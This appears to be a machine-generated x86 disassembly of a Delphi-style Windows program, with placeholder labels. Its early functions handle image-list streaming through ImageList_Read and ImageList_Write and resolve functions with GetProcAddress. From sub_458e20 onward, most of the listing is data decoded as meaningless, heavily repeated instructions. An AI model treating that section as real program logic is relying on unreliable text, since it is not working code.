cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_457704
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45822c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45820f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45810c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458216
mov eax [ ebp - 0xc ]
call sub_403254
retn
mov eax edi
call sub_457704
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_458240
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_457704
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_458150
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45829c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_42033c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_458240
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4582f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41c490
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41c490
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_458578
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c264
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41c284
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45855b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a150
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41919c
mov eax [ ebp - 0x4 ]
call sub_458920
xor eax eax
push ebp
push sub_45853e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458545
mov eax [ ebp - 0xc ]
call sub_403254
mov eax [ ebp - 0x14 ]
call sub_403254
mov eax [ ebp - 0x4 ]
call sub_458924
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4191c4
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_429380
push eax
mov eax [ ebp - 0xc ]
call sub_429380
lea edx [ ebp - 0x30 ]
pop ecx
call sub_423f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4191c4
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429380
push eax
mov eax [ ebp - 0x14 ]
call sub_429380
lea edx [ ebp - 0x30 ]
pop ecx
call sub_423f04
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45751c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_458588
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420abc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4585e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4573a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4585ef
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub eax 0xffffffec
sub_4585ef
mov eax [ ebp - 0x4 ]
call sub_45720c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45871e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41c284
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41c98c
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41c284
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403254
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41c284
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420abc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458701
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41c284
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4573a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41c284
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_458750
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_457444
mov eax edi
call sub_41c264
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41c284
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4582f4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_458588
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4587dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420abc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4588d6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c4c0
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_4573e0
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_4573e0
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4588dd
mov eax [ ebp - 0x4 ]
call sub_403254
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
jmp r-xdata
sub_458944
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
mov edx esi
call sub_4580b4
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_458990
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4589b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4589bc
retn
sub_458e20
inc ebp
add [ eax + ecx * 8 + 0x45 ] bl
add [ eax - 0x38 ] cl
inc ebp
add [ eax - 0x3f ] cl
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x458a2070
add [ eax ] cl
add bh bh
dec esp
rol [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc ebx
push 0xc6b6365
mov [ ebp ] es
cmp eax [ eax ]
add bh bh
jl r-xdata
arpl [ ebx + 0xc ] bp
insd
cmp al 0x8e
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
adc [ eax ] al
inc ebp
add [ ecx ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
mov al [ 0xffffffff9800458d ]
pop [ ecx ]
sbb [ eax ] al
add eax 0x756e654d
jae r-xdata
outsb
jne r-xdata
imul eax [ ecx + edx ] 0x40
add [ eax ] dh
add [ eax ] al
[ ecx + eax * 8 + 0x45 ]
add [ eax ] dh
popad
jns r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xchg ecx eax
inc ecx
add ah bl
retn 0x45
insb
adc [ eax ] al
aas
add [ eax ] al
[ eax + 0x10045c2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
0x45
add bh bh
pop esp
rol [ ebp ] 0x30
or al 0x8c
inc ebp
add [ eax + eax ] bh
add bh bh
clc
aam 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
adc [ eax ] al
cmp eax 0xc0ff0000
enter 0x45 0x1
add [ eax ] al
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
adc al 0xc4
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
dec esp
rol [ ebp ] 0x50
0x45
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ 0xffffffffc7500042 ] 0x45
add al ch
mov [ ebp ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
in al 0x7c
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
push [ eax ]

add [ eax ] ah
add bh bh
sub bl al
inc ebp
add al dh
0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xcc6d6574
jl r-xdata
jl r-xdata
js r-xdata
je r-xdata
je r-xdata
add [ eax + eax ] dl
call [ eax + eax ]
push [ eax + 0x45ca ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
add al 0x11
inc eax
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
call [ eax + 0x45ca ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec [ ebx + eax * 8 + 0x45 ]
add al dl
0x45
adc [ eax ] al
cmp [ eax ] eax
add bh bh
and dl al
inc ebp
add [ eax - 0x36 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
outsd
inc ebp
add [ eax ] al
add bh bh
dec esp
retn
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
outsd
dec ecx
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
int3
add [ eax ] al
ja r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax - 0x2b ] ah
inc ebp
add [ esi + ebx * 8 ] cl
inc ebp
add [ eax - 0x2a ] dl
inc ebp
add [ esi + ebx * 8 ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] bh
add [ eax ] al
add eax [ eax ]
std
xor al 0x4
jb r-xdata
add [ edx - 0x6dcfffbb ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
and al 0x8b
inc ebp
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
inc edx
inc ebp
add [ esp + eax ] ah
dec ecx
je r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
inc ecx
add [ edi + eax ] dh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
add al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
les edx [ ecx + 0x45 ]
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cld
aad 0x45
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esi + ebx * 8 ] ah
inc ebp
add al al
fiadd [ ebp ]
and al 0x4
xor al 0x40
add [ eax - 0x4fffbe00 ] cl
ja r-xdata
add [ edx ] dl
xchg edx eax
inc ebp
add [ esi ] ah
xchg edx eax
inc ebp
add [ eax ] bl
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
je r-xdata
xor al 0x40
jae r-xdata
insd
pushfd
mov eax [ ebp ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sub_458e63
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x458a2070
add [ eax ] cl
add bh bh
dec esp
rol [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc ebx
push 0xc6b6365
mov [ ebp ] es
cmp eax [ eax ]
add bh bh
jl r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
adc [ eax ] al
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
outsb
jne r-xdata
imul eax [ ecx + edx ] 0x40
add [ eax ] dh
add [ eax ] al
[ ecx + eax * 8 + 0x45 ]
add [ eax ] dh
popad
jns r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
[ eax + 0x10045c2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
0x45
add bh bh
pop esp
rol [ ebp ] 0x30
or al 0x8c
inc ebp
add [ eax + eax ] bh
add bh bh
clc
aam 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
adc [ eax ] al
cmp eax 0xc0ff0000
enter 0x45 0x1
add [ eax ] al
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
adc al 0xc4
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
dec esp
rol [ ebp ] 0x50
0x45
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ 0xffffffffc7500042 ] 0x45
add al ch
mov [ ebp ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
in al 0x7c
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
push [ eax ]

add [ eax ] ah
add bh bh
sub bl al
inc ebp
add al dh
0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xcc6d6574
jl r-xdata
jl r-xdata
js r-xdata
je r-xdata
je r-xdata
add [ eax + eax ] dl
call [ eax + eax ]
push [ eax + 0x45ca ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
add al 0x11
inc eax
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
call [ eax + 0x45ca ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec [ ebx + eax * 8 + 0x45 ]
add al dl
0x45
adc [ eax ] al
cmp [ eax ] eax
add bh bh
and dl al
inc ebp
add [ eax - 0x36 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
outsd
inc ebp
add [ eax ] al
add bh bh
dec esp
retn
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
outsd
dec ecx
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
int3
add [ eax ] al
ja r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax - 0x2b ] ah
inc ebp
add [ esi + ebx * 8 ] cl
inc ebp
add [ eax - 0x2a ] dl
inc ebp
add [ esi + ebx * 8 ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] bh
add [ eax ] al
add eax [ eax ]
std
xor al 0x4
jb r-xdata
add [ edx - 0x6dcfffbb ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
and al 0x8b
inc ebp
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
inc edx
inc ebp
add [ esp + eax ] ah
dec ecx
je r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
inc ecx
add [ edi + eax ] dh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
add al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
les edx [ ecx + 0x45 ]
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cld
aad 0x45
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esi + ebx * 8 ] ah
inc ebp
add al al
fiadd [ ebp ]
and al 0x4
xor al 0x40
add [ eax - 0x4fffbe00 ] cl
ja r-xdata
add [ edx ] dl
xchg edx eax
inc ebp
add [ esi ] ah
xchg edx eax
inc ebp
add [ eax ] bl
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
je r-xdata
xor al 0x40
jae r-xdata
insd
pushfd
mov eax [ ebp ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sub_4590e7
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
ja r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax - 0x2b ] ah
inc ebp
add [ esi + ebx * 8 ] cl
inc ebp
add [ eax - 0x2a ] dl
inc ebp
add [ esi + ebx * 8 ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] bh
add [ eax ] al
add eax [ eax ]
std
xor al 0x4
jb r-xdata
add [ edx - 0x6dcfffbb ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
and al 0x8b
inc ebp
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
inc edx
inc ebp
add [ esp + eax ] ah
dec ecx
je r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
inc ecx
add [ edi + eax ] dh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
add al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
les edx [ ecx + 0x45 ]
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cld
aad 0x45
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esi + ebx * 8 ] ah
inc ebp
add al al
fiadd [ ebp ]
and al 0x4
xor al 0x40
add [ eax - 0x4fffbe00 ] cl
ja r-xdata
add [ edx ] dl
xchg edx eax
inc ebp
add [ esi ] ah
xchg edx eax
inc ebp
add [ eax ] bl
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
je r-xdata
xor al 0x40
jae r-xdata
insd
pushfd
mov eax [ ebp ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sub_459218
out dx eax
push [ esi + edx * 8 ]
inc ebp
